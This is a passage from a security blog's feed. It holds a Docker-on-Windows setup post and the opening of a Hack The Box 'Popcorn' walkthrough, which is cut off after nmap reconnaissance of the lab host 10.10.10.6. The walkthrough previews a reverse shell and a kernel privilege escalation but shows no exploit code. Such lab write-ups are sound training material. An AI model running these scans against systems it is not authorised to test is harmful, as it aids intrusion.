From here I can issue ENTRYPOINTS or CMDs to turn the image executable or simply run a bash shell and login.&lt;/p&gt;

&lt;p&gt;Awesome, now I have an on demand kali version of I can run in powershell. This is the end of the Docker series Next post &lt;a href=&quot;/exploitdev/Preparing-for-OSCE.html&quot;&gt;Preparing for OSCE&lt;/a&gt; I’m going to look at some other cool stuff around OSCE.&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><category term="Docker" /><summary type="html">Now that I have Docker setup I’m going to build a PoC nmap container out of a base Kali image.</summary></entry><entry><title type="html">Setting Up Docker on Windows</title><link href="http://localhost:4000/secdevops/Setting-Up-Docker-on-Windows.html" rel="alternate" type="text/html" title="Setting Up Docker on Windows" /><published>2020-05-20T00:00:00+01:00</published><updated>2020-05-20T00:00:00+01:00</updated><id>http://localhost:4000/secdevops/Setting-Up-Docker-on-Windows</id><content type="html" xml:base="http://localhost:4000/secdevops/Setting-Up-Docker-on-Windows.html">&lt;p&gt;This post I’m looking at setting up a PoC Docker image for testing purposes&lt;/p&gt;

&lt;p&gt;Working closely with Application Developers opens you eyes as a security professional, understanding the SDLC and applying it to testing and tooling is one of the most cost effective ways to apply good security practices. Just as developers learn security techniques to become more proficient engineers security professionals learning development process will become better at security.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The full documentation for the tool is available on &lt;a href=&quot;https://docs.docker.com/docker-for-windows/&quot;&gt;docker docs&lt;/a&gt;. Explaining the concepts of Docker is beyond the scope of this post, I’m assuming a little familiarity with the concepts but if you as the reader need more information the full documentation is available &lt;a href=&quot;https://docs.docker.com/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;the-pre-requisites&quot;&gt;The Pre-requisites&lt;/h2&gt;

&lt;p&gt;I’m using a Windows 10 system with a decent CPU and 32GB Ram, although you &lt;em&gt;can&lt;/em&gt; run with less than 8GB I’d recommend at least 8GB of RAM and a few 100GB of disk space for storage. The system needs to be Hypervisor capable.&lt;/p&gt;

&lt;p&gt;This post is covering how to set up Docker on Hyper V, so obviously we need a Windows Host OS with HyperV enabled. 
Before we go onto the next stage we to check if HyperV is installed.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;systeminfo&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following response indicates that I have already got it configured (as it was enabled by default during the OS install):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Hyper-V Requirements:     A hypervisor has been detected. Features required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Hyper-V will not be displayed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Running Hyper V by default is a good security practice as it sandboxes your OS giving you a protective layer against attackers. Sometimes this is not practical and it &lt;em&gt;may&lt;/em&gt; be disabled, instead of the above message if there is no hypervisor environment you will find the following message in the output:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Hyper-V Requirements:     VM Monitor Mode Extensions: Yes
                          Virtualization Enabled In Firmware: Yes
                          Second Level Address Translation: Yes
                          Data Execution Prevention Available: Yes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above components need to be available to enable HyperV. HyperV is a windows feature that can be enabled/disabled via the &lt;strong&gt;Add Remove Windows Features&lt;/strong&gt; tool, how this looks will be a little different depending on your Host’s Windows Version, full documentation on this can be found &lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;docker&quot;&gt;Docker&lt;/h3&gt;

&lt;p&gt;Traditionally Docker and Windows were not friends, the easiest way to create docker images &lt;em&gt;was&lt;/em&gt; to kickstart a Linux VM and run it docker through it. This was impractical and required a lot of effort, these days for windows &lt;a href=&quot;https://hub.docker.com/editions/community/docker-ce-desktop-windows/&quot;&gt;Docker Desktop&lt;/a&gt; does all this for us.&lt;/p&gt;

&lt;h4 id=&quot;a-note-on-daemon-errors&quot;&gt;A note on Daemon Errors&lt;/h4&gt;

&lt;p&gt;Before we get into the configuration we should note that sometimes there can be a little bit of a problem getting the daemon to work properly when docker commands are issued:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-error&quot; data-lang=&quot;error&quot;&gt;Error response from daemon: open \\.\pipe\docker_engine_linux: The system cannot find the file specified.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A restart of the DockerDesktopVM via your Hyper-V Manager and docker service via powershell will usually fix this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com.docker.service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com.docker.service&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Failing that stop the VM then manually end all the docker tasks in &lt;strong&gt;Task Manager&lt;/strong&gt;. Once they have all stopped restart the Docker Desktop App as Admin and try the above commands again.&lt;/p&gt;

&lt;h4 id=&quot;back-to-the-install&quot;&gt;Back to the Install&lt;/h4&gt;

&lt;p&gt;The desktop app has an easy wizard installer which leverages Hyper-V so that Docker Desktop can act as an abstract layer which managing the VM and provides us with functionality on powershell.&lt;/p&gt;

&lt;p&gt;It also comes with a getting started tutorial:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\SecDevOps\posts\dockerD.png&quot; alt=&quot;dockerD&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Skipping that I open a new admin powershell and run the following command to pull down a standard nginx image:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pull&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nginxdemos/hello&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This downloads the image&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Using default tag: latest
latest: Pulling from nginxdemos/hello
550fe1bea624: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;d421ba34525b: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;fdcbcb327323: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;bfbcec2fc4d5: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;0497d4d5654f: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;f9518aaa159c: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;a70e975849d8: Pull &lt;span class=&quot;nb&quot;&gt;complete                                                                                             &lt;/span&gt;Digest: sha256:f5a0b2a5fe9af497c4a7c186ef6412bb91ff19d39d6ac24a4997eaed2b0bb334
Status: Downloaded newer image &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nginxdemos/hello:latest
docker.io/nginxdemos/hello:latest&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And it can be started with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nginxdemos/hello&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I get the following message:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;ae95a80511b8422ea3635f892b97d563390a399dca406dc0ce0b5484f581662f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Cool it started, I need to find out the port the container is serving on with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; command.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                   NAMES
ae95a80511b8        nginxdemos/hello    &lt;span class=&quot;s2&quot;&gt;&quot;nginx -g 'daemon of…&quot;&lt;/span&gt;   14 seconds ago      Up 13 seconds       0.0.0.0:32768-&amp;gt;80/tcp   elastic_heisenberg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In the ports section I can see the container’s port 80 has been forwarded to my host’s port 32768. If I visit http://127.0.0.1:32768/ i get this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\SecDevOps\posts\nginx.png&quot; alt=&quot;nginx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cn also double check via PoSH&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://127.0.0.1:32768/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;to get:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;StatusCode        : 200
StatusDescription : OK
Content           : &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
                    &amp;lt;html&amp;gt;
                    &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                    &amp;lt;title&amp;gt;Hello World&amp;lt;/title&amp;gt;
                    &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAGPElEQVR42u1bDUyUd
                    Rj/iwpolMlcbZqtXFnNsuSCez/OIMg1V7SFONuaU8P1M...
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Cache-Control: no-cache
                    Content-Type: text/html
                    Date: Wed, 20 May 2020 18:16:10 GMT
                    Expires: Wed, 20 May 2020 18:16:09 GMT
                    Serv...
Forms             : {}
Headers           : {[Transfer-Encoding, chunked], [Connection, keep-alive], [Cache-Control, no-cache], [Content-Type,
                    text/html]...}
Images            : {@{innerHTML=; innerText=; outerHTML=&amp;lt;IMG alt=&quot;&lt;/span&gt;NGINX Logo&lt;span class=&quot;s2&quot;&gt;&quot; src=&quot;&lt;/span&gt;data:image/png&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;,iVBORw0KGgoAA
                    AANSUhEUgAAAWAAAABICAMAAAD/N9+RAAAAVFBMVEUAAAAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAA
                    mQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQDBect+AAAAG3RSTlMAB0AY8SD5SM82v1npsJ/YjSl0EVL
                    ftqllgMdZgsoQAAAHd0lEQVR42szZ6XabMBCG4ZGFxSazLzZz//fZc9I4JpbEN8LQ0/dnGwJ5DJGG0HdpM9kkuzVXiqussmRpLr
                    RdnwqDp9ePyY7zXdFbqptHOz00RTVUxWiyquvJ26Upknp2/heWN0Uyzt3qYtKMn805ybsW/LdK01YVC6sVELH81XJ9o6j5q6Qkc
                    epe83dJp8ipf161HSgm1TyPK5//cuN1d5KmE342bsnkLK6hre78LNG0KuWfOrFDwats69w8ln+qFIlrx9Vxf8808e8eJGx9YEXh
                    CpZ3kX2gfFtbrX4m05IonTE7wsGLnpXY1/Kqr3v/5r+NcAOvy8HXCRt74W+alH568KqCJKmM37LafVhe3ZTU1/mmA7uV9Ar8vPj
                    ZVCPDZI+CDdwFC68yIooZnbhmIAx8XyoZu5mcYO9HzhSo47gGCqR53ULPlAGPkuyazJVeKWYsjH15Djy/VhPO8LoM/OJE4XNfeJ
                    19LUfRj18KF9gLA2GZL4/UsLdFHQVccWyTCDjZD9wm7Kt2PgIgjH3ZBlf46iDgnOO7nwusavZmVoCaPU0q1pcnshyoOwa44PiS6
                    6nANw7U0isbK5x7j3gQB0uPAB54T8WZwA/RHrxhLIx9TbsBnLSfA6uRd9WdBzywCFiNUcJ5wr4eRByu7j8G7nhfpj0LuE0A8Ots
                    SBj7ZooIL+dyYLxFm27+EvfSzgHua/GYXrK3Qol9a03bwNxEAeMt2ix/bptzgCeGwFhY7ouAufwIOA/PSni3nJ8B3DAElgtjXwx
                    s8k+Al/BdiVfDWh0PPDAAjhXGvgTnVjkwujzbk1t4TWkOB24TBBwrjH2JQZnaC6xGsPdCT296MHA/MgKWC2NfL7Blp2ov8AM88/
                    gNbX8osCrc5xMAA2Ho6wIXHTt1+4C1iZwMW8NvzYcCN67vAICBMPZ1galip3QXcAXHXzyVlB8AYyiT5wAYCWNfF1gtYGYWAufhN
                    ynyTWqiDwPOjeelnQiYShMQBr5+YNIWzMwy4CX69afv1NNRwHr07FKEwDT4hTPs6wL7P+tCxQKXm/eifJ963wmMF7hCYWBXGJdp
                    AsBUopkZAyv3j3+i9PUtTa/U9VcAGC1wmgAwFsa+LnBooLxj4K0t2qjo8AAwWuAIAO8TznoSANMEZmYErA14p3EyMF7gSgLAQBj
                    4ImBVg5kZAM/8u4VAJwJ7l+2GADAQBr4A2D+1Z0oMnKM3Y2cD4wUOAANh5IuB6cJOsxg4Q0eeCwwXuFETBnZLDfSVA1NwZsbAJX
                    wN/C+B7771BAAjYeyLgX0z8yACVlawx1NaXh+5TcMLHACGwtgXA6OZ2QUObdGsorfabjIsr4wcNOACB4CBMPLFwOHpcuwx8NWgL
                    XTJURW0H1gtngUOA8cLLz1FAsOZWQ4MfFH5B8CV7x75b4D/NHduS47CMBCVwYFAiDEmCQT+/z/3ZWumah1otZdL/MxMZc5gybJa
                    nU8tLI9DhF8PESXJ10k64PAxyn1LiPisMhr/N8kNHF+bpwPOis95+juS3IJOrsgQYBlXj2mWFVHRgHGC+4pj2kKjbG4ufKGRLmd
                    tTTJgc12WKn1BofE7zBTXzAhwtlIqP9h5gmTAbq1xcHqpvBbHBgRY7suXPTl/ROMB4wR36mUPKjXnNwLcrVxXXimRZTLgDBSiZ1
                    5XYj3XAwAWv3zh7gnAXtIAx6Etnq888cIdX/fZDgDul1tGvf4Vtn0S4M8J7i7ROq1lhCVHzzwGvBpYbJ5AOEgq4EEzZn5K01Mrm
                    qvNOmDTLrft+8FSRzQecFBpO05p26tlnw7oIso14YnJ3i5aL6DF0wMuleqkM4Qn+smcAKRTL1Y65UDQVAO+WK2+7gTplH54usjW
                    AXek+K+LCuxEwGMLul0R4EPFfz8L18zzKmDxIKSCN95LIuBGr3GujpevErqxGQDuLaPuyUAfBAPGg6Mx4OME2DhQVgUJWAIzQnB
                    FfRAeMI5N1XEjBBiwjCxg0+qHYG7wt/GA8capDh+CqYkpCoykjPKWesio2gywEwD4qDEuDNjUJGCptQqUAB5MB3w1APBhg4gYsP
                    QtCbib00Zpi3wrwM1FAOBjR2lrZBXCARY3J623bAS4yAQAPnIYHAOWkgSc2xS+T7MV4CAA8LF2BhiwBAwYP4+lPBsBdgIAH2XIg
                    QHjTf+SrRw5auEAG5Dg9ID3t5TBgM3EWR88eMAVCVieYM5aDXgHUyQAmKiZR9nIFckJC/gFnALUgHew9QKAiZq5A3+EXspDAw7g
                    P64GvIcxXQvfHl2B7tiozSf+y1JSNQ31gRYDQb6HteKQ4B3s4QucflRrDW8OKiHBujCO3s0u5qAjwKR0vnkDozL1emgd5W6EWa1
                    ud7l97G0n3jhYzACOEMlHtVpjeBA/mLf/7IOoQsa7y+b7GDR3Rbw98fKQLy+5xv7VIXowIhy1ztUfbdzLYrz7cbrvRb/K+nf7wP
                    PQpAXsEQ/7l2AXW97/AGkCwaNsIif8zU3y5eZaO/mK/jKDV1s872/Fz11K5TLE1zzEiP1km8ndDMcj3JvmFfqdvubhD8TgHPiN+
                    LViAAAAAElFTkSuQmCC&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;; outerText=; tagName=IMG; alt=NGINX Logo; src=data:image/png;base64,iVBORw0KG
                    goAAAANSUhEUgAAAWAAAABICAMAAAD/N9+RAAAAVFBMVEUAAAAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAA
                    mQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQAAmQDBect+AAAAG3RSTlMAB0AY8SD5SM82v1npsJ/YjSl
                    0EVLftqllgMdZgsoQAAAHd0lEQVR42szZ6XabMBCG4ZGFxSazLzZz//fZc9I4JpbEN8LQ0/dnGwJ5DJGG0HdpM9kkuzVXiqussm
                    RpLrRdnwqDp9ePyY7zXdFbqptHOz00RTVUxWiyquvJ26Upknp2/heWN0Uyzt3qYtKMn805ybsW/LdK01YVC6sVELH81XJ9o6j5q
                    6Qkcepe83dJp8ipf161HSgm1TyPK5//cuN1d5KmE342bsnkLK6hre78LNG0KuWfOrFDwats69w8ln+qFIlrx9Vxf8808e8eJGx9
                    YEXhCpZ3kX2gfFtbrX4m05IonTE7wsGLnpXY1/Kqr3v/5r+NcAOvy8HXCRt74W+alH568KqCJKmM37LafVhe3ZTU1/mmA7uV9Ar
                    8vPjZVCPDZI+CDdwFC68yIooZnbhmIAx8XyoZu5mcYO9HzhSo47gGCqR53ULPlAGPkuyazJVeKWYsjH15Djy/VhPO8LoM/OJE4X
                    NfeJ19LUfRj18KF9gLA2GZL4/UsLdFHQVccWyTCDjZD9wm7Kt2PgIgjH3ZBlf46iDgnOO7nwusavZmVoCaPU0q1pcnshyoOwa44
                    PiS66nANw7U0isbK5x7j3gQB0uPAB54T8WZwA/RHrxhLIx9TbsBnLSfA6uRd9WdBzywCFiNUcJ5wr4eRByu7j8G7nhfpj0LuE0A
                    8OtsSBj7ZooIL+dyYLxFm27+EvfSzgHua/GYXrK3Qol9a03bwNxEAeMt2ix/bptzgCeGwFhY7ouAufwIOA/PSni3nJ8B3DAElgt
                    jXwxs8k+Al/BdiVfDWh0PPDAAjhXGvgTnVjkwujzbk1t4TWkOB24TBBwrjH2JQZnaC6xGsPdCT296MHA/MgKWC2NfL7Blp2ov8A
                    M88/gNbX8osCrc5xMAA2Ho6wIXHTt1+4C1iZwMW8NvzYcCN67vAICBMPZ1galip3QXcAXHXzyVlB8AYyiT5wAYCWNfF1gtYGYWA
                    ufhNynyTWqiDwPOjeelnQiYShMQBr5+YNIWzMwy4CX69afv1NNRwHr07FKEwDT4hTPs6wL7P+tCxQKXm/eifJ963wmMF7hCYWBX
                    GJdpAsBUopkZAyv3j3+i9PUtTa/U9VcAGC1wmgAwFsa+LnBooLxj4K0t2qjo8AAwWuAIAO8TznoSANMEZmYErA14p3EyMF7gSgL
                    AQBj4ImBVg5kZAM/8u4VAJwJ7l+2GADAQBr4A2D+1Z0oMnKM3Y2cD4wUOAANh5IuB6cJOsxg4Q0eeCwwXuFETBnZLDfSVA1NwZs
                    bAJXwN/C+B7771BAAjYeyLgX0z8yACVlawx1NaXh+5TcMLHACGwtgXA6OZ2QUObdGsorfabjIsr4wcNOACB4CBMPLFwOHpcuwx8
                    NWgLXTJURW0H1gtngUOA8cLLz1FAsOZWQ4MfFH5B8CV7x75b4D/NHduS47CMBCVwYFAiDEmCQT+/z/3ZWumah1otZdL/MxMZc5g
                    ybJanU8tLI9DhF8PESXJ10k64PAxyn1LiPisMhr/N8kNHF+bpwPOis95+juS3IJOrsgQYBlXj2mWFVHRgHGC+4pj2kKjbG4ufKG
                    RLmdtTTJgc12WKn1BofE7zBTXzAhwtlIqP9h5gmTAbq1xcHqpvBbHBgRY7suXPTl/ROMB4wR36mUPKjXnNwLcrVxXXimRZTLgDB
                    SiZ15XYj3XAwAWv3zh7gnAXtIAx6Etnq888cIdX/fZDgDul1tGvf4Vtn0S4M8J7i7ROq1lhCVHzzwGvBpYbJ5AOEgq4EEzZn5K0
                    1MrmqvNOmDTLrft+8FSRzQecFBpO05p26tlnw7oIso14YnJ3i5aL6DF0wMuleqkM4Qn+smcAKRTL1Y65UDQVAO+WK2+7gTplH54
                    usjWAXek+K+LCuxEwGMLul0R4EPFfz8L18zzKmDxIKSCN95LIuBGr3GujpevErqxGQDuLaPuyUAfBAPGg6Mx4OME2DhQVgUJWAI
                    zQnBFfRAeMI5N1XEjBBiwjCxg0+qHYG7wt/GA8capDh+CqYkpCoykjPKWesio2gywEwD4qDEuDNjUJGCptQqUAB5MB3w1APBhg4
                    gYsPQtCbib00Zpi3wrwM1FAOBjR2lrZBXCARY3J623bAS4yAQAPnIYHAOWkgSc2xS+T7MV4CAA8LF2BhiwBAwYP4+lPBsBdgIAH
                    2XIgQHjTf+SrRw5auEAG5Dg9ID3t5TBgM3EWR88eMAVCVieYM5aDXgHUyQAmKiZR9nIFckJC/gFnALUgHew9QKAiZq5A3+EXspD
                    Aw7gP64GvIcxXQvfHl2B7tiozSf+y1JSNQ31gRYDQb6HteKQ4B3s4QucflRrDW8OKiHBujCO3s0u5qAjwKR0vnkDozL1emgd5W6
                    EWa1ud7l97G0n3jhYzACOEMlHtVpjeBA/mLf/7IOoQsa7y+b7GDR3Rbw98fKQLy+5xv7VIXowIhy1ztUfbdzLYrz7cbrvRb/K+n
                    f7wPPQpAXsEQ/7l2AXW97/AGkCwaNsIif8zU3y5eZaO/mK/jKDV1s872/Fz11K5TLE1zzEiP1km8ndDMcj3JvmFfqdvubhD8TgH
                    PiN+LViAAAAAElFTkSuQmCC}}
InputFields       : {@{innerHTML=; innerText=; outerHTML=&amp;lt;INPUT onchange=changeCookie() id=check type=checkbox&amp;gt;;
                    outerText=; tagName=INPUT; onchange=changeCookie(); id=check; type=checkbox}}
Links             : {}
ParsedHtml        : System.__ComObject
RawContentLength  : 7218&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now that I have a fully operational container I can look at getting it onto K8s, I stop the instance via its Container ID:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ae95a80511b8&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Excellent! Now that I have a PoC in play next post &lt;a href=&quot;/secdevops/Building-a-Kali-Container.html&quot;&gt;Building a Kali Container&lt;/a&gt; I’m going to look into setting up a custom container we can use for auto deployments.&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><category term="Docker" /><summary type="html">This post I’m looking at setting up a PoC Docker image for testing purposes</summary></entry><entry><title type="html">HTB Popcorn Walkthrough with Kali</title><link href="http://localhost:4000/kalisetup/HTB-Popcorn-with-Kali.html" rel="alternate" type="text/html" title="HTB Popcorn Walkthrough with Kali" /><published>2020-04-20T00:00:00+01:00</published><updated>2020-04-20T00:00:00+01:00</updated><id>http://localhost:4000/kalisetup/HTB-Popcorn-with-Kali</id><content type="html" xml:base="http://localhost:4000/kalisetup/HTB-Popcorn-with-Kali.html">&lt;p&gt;A while back I re-started my Hack the Box journey, eventually making it to Guru. This post covers my write-up of Popcorn : 10.10.10.6 using Kali Linux.&lt;/p&gt;

&lt;h2 id=&quot;why-popcorn&quot;&gt;Why Popcorn?&lt;/h2&gt;

&lt;p&gt;Popcorn is an interesting box, it has an easy to access web layer but requires a little bit of custom testing to actually get a reverse shell. Once you get into the box it is exploitable via it’s ‘classic’ kernel which easily allows root access to the system. This box is rated medium difficulty and is a great example of an ‘OSCP like’ box as it tells a story with believable weaknesses. By way of comparison Popcorn took around 8 hours to beat and individual OSCP exam challenges take me between 40 min and 6 hours each.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;First we assign the ip addresses to a local variables:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;POPCORN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.10.6
&lt;span class=&quot;nv&quot;&gt;ATTACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.34&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;First we run the nmap scan (avoiding the ping) to identify the running services:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;nmap &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This gives me the following output&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Nmap scan report for 10.10.10.6
Host is up (0.046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Immediately this looks like a Linux webserver, I kick up the gas to a more aggressive and focused scan:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;and get the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Nmap scan report for 10.10.10.6
Host is up (0.042s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
